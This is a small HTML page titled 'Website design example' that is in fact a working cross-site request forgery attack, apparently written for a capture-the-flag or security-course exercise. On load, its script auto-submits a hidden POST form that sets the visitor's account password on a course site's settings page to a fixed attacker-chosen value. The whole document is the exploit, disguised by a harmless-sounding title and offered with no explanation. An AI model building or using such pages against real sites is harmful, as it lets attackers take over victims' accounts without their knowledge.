
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Website design example</title>
</head>
<body>
    <form
        id="csrf-form"
        action="https://cats.is-course.ru/settings"
        method="POST"
    >
        <input
            type="password"
            name="password"
            value="CTFpasspass123!"
        >
        <input
            type="password"
            name="confirm-password"
            value="CTFpasspass123!"
        >
    </form>

    <script>
        document.getElementById("csrf-form").submit();
    </script>
</body>
</html>
